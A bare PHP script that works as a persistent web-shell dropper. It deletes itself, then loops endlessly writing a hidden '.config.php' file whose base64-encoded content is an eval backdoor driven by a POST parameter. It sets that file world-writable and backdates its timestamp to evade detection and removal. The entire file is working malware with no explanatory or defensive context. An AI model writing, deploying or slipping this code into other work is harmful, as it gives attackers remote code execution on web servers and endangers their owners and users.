<?php
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = ".config.php";
 $code = base64_decode("PD9waHAgIEBldmFsKCRfUE9TVFsnc291bm8nXSk7ICA/Pg==");
 while(true) {
     file_put_contents($file, $code);
     system("chmod 777 .config.php");
     touch(".config.php",mktime(20,15,1,11,28,2016));
     usleep(1000);
 }
?>